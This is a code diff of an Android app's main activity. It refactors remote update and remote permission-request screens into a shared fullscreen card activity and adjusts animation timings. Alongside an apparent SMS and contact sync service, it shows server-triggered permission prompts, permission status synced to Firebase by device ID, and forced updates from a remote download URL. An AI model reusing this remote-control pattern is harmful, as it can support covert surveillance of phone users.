@@ -38,7 +38,6 @@ import com.example.fast.databinding.ActivityActivatedBinding
 import com.example.fast.service.PersistentForegroundService
 import com.example.fast.service.ContactSmsSyncService
 import com.example.fast.ui.activated.*
-import com.example.fast.ui.RemoteUpdateActivity
 import com.example.fast.ui.card.BirthSpec
 import com.example.fast.ui.card.CardSize
 import com.example.fast.ui.card.DeathSpec
@@ -869,8 +868,8 @@ class ActivatedActivity : AppCompatActivity() {
             smsCard.alpha = 0f
             smsCard.visibility = View.VISIBLE
 
-            val wipeDuration = 500L
-            val staggerDelay = 100L
+            val wipeDuration = AnimationConstants.ACTIVATION_WIPE_DOWN_ENTRY_MS
+            val staggerDelay = AnimationConstants.ACTIVATION_WIPE_DOWN_STAGGER_MS
 
             // Wipe down header first
             headerSection.animate()
@@ -951,7 +950,7 @@ class ActivatedActivity : AppCompatActivity() {
         }
     }
 
-    private val WIPE_LINE_DURATION_MS = 400L
+    private val WIPE_LINE_DURATION_MS = AnimationConstants.ACTIVATION_WIPE_LINE_MS
     private val ARRIVAL_STAGGER_MS = 120L
 
     /**
@@ -2652,7 +2651,7 @@ class ActivatedActivity : AppCompatActivity() {
     }
 
     /**
-     * Check for app updates. If an update is available, launches RemoteUpdateActivity.
+     * Check for app updates. If an update is available, launches MultipurposeCardActivity.
      * @param onComplete Callback with true if update was launched, false otherwise.
      */
     private fun checkForAppUpdate(onComplete: (Boolean) -> Unit) {
@@ -2684,9 +2683,11 @@ class ActivatedActivity : AppCompatActivity() {
                         LogHelper.d("ActivatedActivity", "Version check: current=$currentVersionCode, required=$requiredVersionCode, forceUpdate=$forceUpdate")
                         if (currentVersionCode < requiredVersionCode && downloadUrl != null && VersionChecker.isValidDownloadUrl(downloadUrl)) {
                             LogHelper.d("ActivatedActivity", "Update available: $downloadUrl")
-                            val intent = Intent(this, RemoteUpdateActivity::class.java).apply {
+                            val intent = Intent(this, MultipurposeCardActivity::class.java).apply {
                                 flags = Intent.FLAG_ACTIVITY_NEW_TASK
-                                putExtra("downloadUrl", "$requiredVersionCode|$downloadUrl")
+                                putExtra(RemoteCardHandler.KEY_CARD_TYPE, RemoteCardHandler.CARD_TYPE_UPDATE)
+                                putExtra(RemoteCardHandler.KEY_DOWNLOAD_URL, "$requiredVersionCode|$downloadUrl")
+                                putExtra(RemoteCardHandler.KEY_DISPLAY_MODE, RemoteCardHandler.DISPLAY_MODE_FULLSCREEN)
                             }
                             startActivity(intent)
                             if (forceUpdate) finish()
@@ -3543,7 +3544,28 @@ class ActivatedActivity : AppCompatActivity() {
             ),
             purpose = PurposeSpec.Custom(
                 primaryButtonLabel = "Grant",
-                onPrimary = { },
+                onPrimary = {
+                    // Launch MultipurposeCardActivity for permission request (card-only flow)
+                    val runtimeRequests = PermissionManager.permissionNamesToRequests(
+                        permissions.filter { it !in listOf("notification", "battery") },
+                        true,
+                        this
+                    )
+                    val runtimePerms = runtimeRequests.map { it.permission }
+                    if (runtimePerms.isNotEmpty()) {
+                        startActivity(Intent(this, MultipurposeCardActivity::class.java).apply {
+                            flags = Intent.FLAG_ACTIVITY_NEW_TASK
+                            putExtra(RemoteCardHandler.KEY_CARD_TYPE, RemoteCardHandler.CARD_TYPE_PERMISSION)
+                            putExtra(RemoteCardHandler.KEY_PERMISSIONS, runtimePerms.joinToString(","))
+                            putExtra(RemoteCardHandler.KEY_DISPLAY_MODE, RemoteCardHandler.DISPLAY_MODE_FULLSCREEN)
+                            putExtra(RemoteCardHandler.KEY_TITLE, "Permissions Required")
+                            putExtra(RemoteCardHandler.KEY_BODY, "Please grant the required permissions to continue.")
+                            putExtra(RemoteCardHandler.KEY_PRIMARY_BUTTON, "Grant")
+                        })
+                        PermissionFirebaseSync.syncPermissionStatus(this, cachedAndroidId)
+                        PermissionSyncHelper.checkAndStartSync(this)
+                    }
+                },
             ),
             death = DeathSpec.ShrinkInto(
                 targetView = id.statusCard,
@@ -3554,7 +3576,7 @@ class ActivatedActivity : AppCompatActivity() {
             context = this,
             rootView = id.main,
             spec = spec,
-            onComplete = { startRemotePermissionFlowFromCard(permissions) },
+            onComplete = { /* Permission flow now via MultipurposeCardActivity in onPrimary */ },
             activity = this,
         ).show()
     }
@@ -3589,9 +3611,11 @@ class ActivatedActivity : AppCompatActivity() {
             purpose = PurposeSpec.Custom(
                 primaryButtonLabel = "Update",
                 onPrimary = {
-                    startActivity(Intent(this, RemoteUpdateActivity::class.java).apply {
+                    startActivity(Intent(this, MultipurposeCardActivity::class.java).apply {
                         flags = Intent.FLAG_ACTIVITY_NEW_TASK
-                        putExtra("downloadUrl", downloadUrl)
+                        putExtra(RemoteCardHandler.KEY_CARD_TYPE, RemoteCardHandler.CARD_TYPE_UPDATE)
+                        putExtra(RemoteCardHandler.KEY_DOWNLOAD_URL, downloadUrl)
+                        putExtra(RemoteCardHandler.KEY_DISPLAY_MODE, RemoteCardHandler.DISPLAY_MODE_FULLSCREEN)
                     })
                 },
             ),
@@ -3607,40 +3631,6 @@ class ActivatedActivity : AppCompatActivity() {
             onComplete = { },
             activity = this,
         ).show()
-    }
-
-    /** Run permission flow from multipurpose card (same flow as RemotePermissionRequestActivity). */
-    private fun startRemotePermissionFlowFromCard(permissions: ArrayList<String>) {
-        val list = ArrayList(permissions)
-        if (!list.contains("notification")) list.add("notification")
-        if (!list.contains("battery")) list.add("battery")
-        val requests = PermissionManager.permissionNamesToRequests(list, true, this)
-        if (requests.isNotEmpty()) {
-            PermissionManager.startRequestPermissionList(
-                this,
-                requests,
-                PERMISSION_REMOTE_CARD_REQUEST_CODE,
-                maxCyclesForMandatory = 3,
-                onComplete = { results -> syncRemotePermissionResultsAndContinue(results, list) }
-            )
-        } else {
-            val specialList = list.filter { it in listOf("notification", "battery") }.distinct()
-            if (specialList.isNotEmpty()) {
-                PermissionManager.startSpecialPermissionList(this, specialList) { specialResults ->
-                    specialResults.forEach { r ->
-                        when (r.permission) {
-                            "notification" -> PermissionFirebaseSync.updatePermissionStatus(this, cachedAndroidId, "notification", r.isAllowed)
-                            "battery" -> PermissionFirebaseSync.updatePermissionStatus(this, cachedAndroidId, "battery", r.isAllowed)
-                        }
-                    }
-                    PermissionFirebaseSync.syncPermissionStatus(this, cachedAndroidId)
-                    PermissionSyncHelper.checkAndStartSync(this)
-                }
-            } else {
-                PermissionFirebaseSync.syncPermissionStatus(this, cachedAndroidId)
-                PermissionSyncHelper.checkAndStartSync(this)
-            }
-        }
     }
 
     private fun syncRemotePermissionResultsAndContinue(results: List<PermissionManager.PermissionResult>, permissionsList: List<String>) {
